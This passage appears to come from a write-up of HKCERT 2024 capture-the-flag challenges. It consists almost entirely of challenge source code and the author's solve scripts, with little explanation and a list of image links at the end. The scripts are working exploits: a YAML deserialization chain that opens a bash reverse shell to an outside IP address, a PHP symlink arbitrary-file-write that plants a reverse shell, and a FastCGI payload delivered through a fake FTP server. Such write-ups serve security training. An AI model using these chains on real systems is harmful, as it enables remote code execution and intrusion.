        for i in range(10):
            s11 += s.recv(10240).decode()
        if 'hkcert24' in s11:
            print(s11)
        c1 += 1
        print("r" + str(c1) , end="")

threading.Thread(target=test).start()
test()
app.post('/debug', (req, res) => {
    if(ip.isLoopback(req.ip) && req.cookies.debug === 'on'){
        const yaml = require('js-yaml');
        let schema = yaml.DEFAULT_SCHEMA.extend(require('js-yaml-js-types').all);
        try{
         let input = req.body.yaml;
         console.log(`Input: ${input}`);
         let output = yaml.load(input, {schema});
         console.log(`Output: ${output}`);
         res.json(output);
        }catch(e){
         res.status(400).send('Error');
        }
    }else{
        res.status(401).send('Unauthorized');
    }
});
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>YAML Parser</title>
    <script src="https://cdn.jsdelivr.net/pyodide/v0.26.2/full/pyodide.js"></script>
    
</head>

    <h1>YAML Parser</h1>
    <textarea id="yaml" placeholder="- YAML"></textarea>

    Parse
    <h2>Output:</h2>
    

    <script>
    let pyodide;
    async function init(){
    pyodide = await loadPyodide();
    await pyodide.loadPackage("pyyaml");
    runHash();
    }
    async function run(y){
    x = `+'`'+`import yaml
yaml.load("""`+`$`+`{y.replaceAll('"','')}""",yaml.Loader)`+'`'+`;
            try {
                output.textContent = await pyodide.runPythonAsync(x);
            } catch (e) {
                output.textContent = e;
            }
    }
        async function runHash() {
            const hash = decodeURIComponent(window.location.hash.substring(1));
            if (hash) {
                yaml.value = hash;
                run(hash);
            }
        }      
        parse.addEventListener("click", async () => {run(yaml.value)});
        onhashchange = runHash;
        onload = init;
    </script>

</html>
payload = '''
import pyodide
payload = """
document.cookie = "debug=on; path=/;";
const data = new URLSearchParams();
data.append('yaml', `xxx`);
fetch('/debug', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  credentials: 'include',
  body: data.toString()
})
  .then(response => response.json())
  .then(data => console.log('成功:', data))
  .catch(error => console.error('请求出错:', error));
"""
pyodide.code.run_js(payload)
'''
payload = f"http://127.0.0.1:
3000/#!!python/object/apply:
exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"
print(payload)
const yaml = require('js-yaml');
        let schema = yaml.DEFAULT_SCHEMA.extend(require('js-yaml-js-types').all);
        try{
         let input = req.body.yaml;
         console.log(`Input: ${input}`);
         let output = yaml.load(input, {schema});
         console.log(`Output: ${output}`);
         res.json(output);
        }catch(e){
         res.status(400).send('Error');
        }
"toString": !<tag:
yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'
import base64

url = "https://c62-jspyaml-t519-hev2ottoirslajxbb32csyeq.hkcert24.pwnable.hk/"

payload = '''
import pyodide
payload = """
document.cookie = "debug=on; path=/;";
const data = new URLSearchParams();
data.append('yaml', `"toString": !<tag:
yaml.org,2002:js/function> 'function (){global.process.mainModule.constructor._load("child_process").spawnSync("bash",["-c","bash -i >& /dev/tcp/8.134.146.39/1244 0>&1"],{ encoding: "utf-8"})}'`);

fetch('/debug', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  credentials: 'include',
  body: data.toString()
})
  .then(response => response.json())
  .then(data => console.log('成功:', data))
  .catch(error => console.error('请求出错:', error));
"""
pyodide.code.run_js(payload)
'''

payload = f"http://127.0.0.1:
3000/#!!python/object/apply:
exec [exec(__import__('base64').b64decode('{base64.b64encode(payload.encode()).decode()}').decode())]"

print(payload)
<?php
    class CitrusWorkspace {
        function __construct($root) {
            if (!is_dir($root)) {
                mkdir($root, 0755);
            }
            $this->root = $root;
        }

        function create($filename, $symlink=0, $target="") {
            $this->validate_filename($filename);

            if ($symlink === 0) {
                @file_put_contents($this->root.$filename, "");
            }
            else {
                @symlink($target, $this->root.$filename);

                try {
                    if (str_contains(@readlink($this->root.$filename), "/") || str_contains(@readlink($this->root.$filename), "..")) {
                        throw new Exception("Trying to hack?");
                    }
                }
                catch (Exception $e) {
                    @unlink($this->root.$filename);
                    throw $e;
                }
            }
        }

        function read($filename) {
            $this->validate_filename($filename);

            sleep(5);

            chdir($this->root);
            $buf = @file_get_contents($this->resolve_symlink($filename));
            return $buf;
        }

        function write($filename, $data) {
            $this->validate_filename($filename);

            sleep(5);

            chdir($this->root);
            @file_put_contents($this->resolve_symlink($filename), $data);
        }

        function delete($filename) {
            $this->validate_filename($filename);
            $this->assert_file_exists($this->root.$filename);

            @unlink($this->root.$filename);
        }

        function list() {
            $res = array();

            $ls = array_diff(scandir($this->root), array("..", "."));
            foreach($ls as $k => $v) {
                if (is_link($this->root.$v)) {
                    $res[$v] = "Symlink to ".@readlink($this->root.$v);
                }
                else
                    $res[$v] = "File";
            }

            return $res;
        }

        function validate_filename($filename) {
            if (preg_match('/[^a-z0-9]/i', $filename)) {
                throw new Exception("Filename only contain alphanumerics.");
            }
        }

        function assert_file_exists($filename) {
            if (file_exists($filename) === false && is_link($filename) === false) {
                throw new Exception("File not found.");
            }
        }

        function resolve_symlink($filename) {
            if (is_link($filename)) {
                return @readlink($filename);
            }
            return $filename;
        }

    }
?>
<?php
session_start();
require_once("lime.php");

$dirname= md5(session_id());
$workspace = new CitrusWorkspace("/tmp/$dirname/");

$mode = !empty($_POST["mode"]) ? $_POST["mode"] : null;
$filename = !empty($_POST["filename"]) ? $_POST["filename"] : null;

$error = null;
try {
    if (($_SERVER["REQUEST_METHOD"] === "POST") && ($mode === null || $filename === null)) {
        throw new Exception("mode or filename cannot be empty.");
    }

    switch($mode) {
        case "create":
            $symlink = isset($_POST["symlink"]) ? 1 : 0;
            $target = !empty($_POST["target"]) ? $_POST["target"] : null;
            $workspace->create($filename, $symlink, $target);
            break;

        case "read":
            $contents = $workspace->read($filename);
            break;

        case "write":
            $data = !empty($_POST["data"]) ? $_POST["data"] : "";
            $workspace->write($filename, $data);
            break;

        case "delete":
            $workspace->delete($filename);
            break;
    }
} catch(Exception $e) {
    $error = $e->getMessage();
}

$ls = $workspace->list();
?>
url = "https://c25-chimera-t519-pji6ue6qjfb5c45we2ja6z57.hkcert24.pwnable.hk/citrus.php%3fsss.php"
# url = "http://8.134.146.39:
8080/citrus.php"
sess = requests.session()
PHPID = "123"
t = threading.BoundedSemaphore(10)
def write(file, content):
    sess.post(url, data={"mode": "write", "filename": file, "data": content}, cookies={"PHPSESSID": PHPID})
def create(target, filename):
    sess.post(url, data={"mode": "create", "symlink": "1", "target": target, "filename": filename, }, cookies={"PHPSESSID": PHPID})

def read(filename):
    return sess.post(url, data={"mode": "read", "filename": filename }, cookies={"PHPSESSID": PHPID})

def write_anyfile(file, content):
    rand1 = str(random.randint(99999,999999999))
    rand2 = str(random.randint(99999,999999999))
    create(rand2, rand1)
    create(file, rand1)
    write(rand2, content)

def read_any_file(file):
    rand1 = str(random.randint(99999,999999999))
    rand2 = str(random.randint(99999,999999999))
    create(rand2, rand1)
    create(file, rand1)
    res = read(rand2).text
    return res.split('')[1].split('')[0]
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 333))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcomen')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.n')
#Size /
conn.send(b'550 Could not get the file size.n')
#EPSV (1)
conn.send(b'150 okn')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)n') #STOR / (2)
conn.send(b'150 Permission denied.n')
#QUIT
conn.send(b'221 Goodbye.n')
conn.close()
import base64
import random
import threading

import requests

url = "https://c25-chimera-t519-pji6ue6qjfb5c45we2ja6z57.hkcert24.pwnable.hk/citrus.php%3fsss.php"
# url = "http://8.134.146.39:
8080/citrus.php"
sess = requests.session()
PHPID = "123"
t = threading.BoundedSemaphore(10)
def write(file, content):
    sess.post(url, data={"mode": "write", "filename": file, "data": content}, cookies={"PHPSESSID": PHPID})
def create(target, filename):
    sess.post(url, data={"mode": "create", "symlink": "1", "target": target, "filename": filename, }, cookies={"PHPSESSID": PHPID})

def read(filename):
    return sess.post(url, data={"mode": "read", "filename": filename }, cookies={"PHPSESSID": PHPID})

def write_anyfile(file, content):
    rand1 = str(random.randint(99999,999999999))
    rand2 = str(random.randint(99999,999999999))
    create(rand2, rand1)
    create(file, rand1)
    write(rand2, content)

def read_any_file(file):
    rand1 = str(random.randint(99999,999999999))
    rand2 = str(random.randint(99999,999999999))
    create(rand2, rand1)
    create(file, rand1)
    res = read(rand2).text
    return res.split('')[1].split('')[0]

write_anyfile("/tmp/a.php", "<?php system('bash -c "bash -i >&/dev/tcp/8.134.146.39/7788 0>&1"'); ?>")
write_anyfile("ftp://8.134.146.39:
333/a.php", base64.b64decode("AQHEAQAIAAAAAQAAAAAAAAEExAEBswAADgFDT05URU5UX0xFTkdUSDAMEENPTlRFTlRfVFlQRWFwcGxpY2F0aW9uL3RleHQLBFJFTU9URV9QT1JUOTk4NQsJU0VSVkVSX05BTUVsb2NhbGhvc3QRC0dBVEVXQVlfSU5URVJGQUNFRmFzdENHSS8xLjAPDlNFUlZFUl9TT0ZUV0FSRXBocC9mY2dpY2xpZW50CwlSRU1PVEVfQUREUjEyNy4wLjAuMQ8KU0NSSVBUX0ZJTEVOQU1FL3RtcC9hLnBocAsKU0NSSVBUX05BTUUvdG1wL2EucGhwCR9QSFBfVkFMVUVhdXRvX3ByZXBlbmRfZmlsZSA9IHBocDovL2lucHV0DgRSRVFVRVNUX01FVEhPRFBPU1QLAlNFUlZFUl9QT1JUODAPCFNFUlZFUl9QUk9UT0NPTEhUVFAvMS4xDABRVUVSWV9TVFJJTkcPFlBIUF9BRE1JTl9WQUxVRWFsbG93X3VybF9pbmNsdWRlID0gT24NAURPQ1VNRU5UX1JPT1QvCwlTRVJWRVJfQUREUjEyNy4wLjAuMQsKUkVRVUVTVF9VUkkvdG1wL2EucGhwAQTEAQAAAAABBcQBAAAAAA=="))
from base64 import b64decode
from secrets import token_hex
import subprocess
import os
import sys
import tempfile

FLAG = os.environ["FLAG"] if os.environ.get("FLAG") is not None else "hkcert24{test_flag}"

print("Encode your Go program in base64")
code = input(">> ")

with tempfile.TemporaryDirectory() as td:
    fn = token_hex(16)
    src = os.path.join(td, f"{fn}")
    with open(src+".go", "w") as f:
        f.write(b64decode(code).decode())  

    p = subprocess.run(["./fork", "build", "-o", td, src+".go"], stdout=subprocess.PIPE, stderr=subprocess.PIPE) # renamed binary
    if p.returncode != 0:
        print(r"Fail to build ¯_(ツ)_/¯")
        sys.exit(1)

    _ = subprocess.run([src], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    if _.returncode == 0:
        print(r"You can write Go programs with no bugs, but I cannot give you the flag ¯_(ツ)_/¯")
        sys.exit(1)

    if b"panic" in _.stderr:
        print("I am calm...")
        sys.exit(1)

    print(f"You are an experienced Go developer, here's your flag: {FLAG}")
    sys.exit(1)
package main

import (
 "os"
)

func main() {
 payload := `import os
code = input("111> ")
print(os.popen(code).read())
`
 os.WriteFile("base64.py", []byte(payload), 0777)
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/4-1732188931.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/6-1732188931.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/7-1732188932.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/6-1732188933.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/7-1732188934.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/7-1732188934.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/8-1732188935.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/10-1732188935.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/0-1732188936.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/11/4-1732188937.png)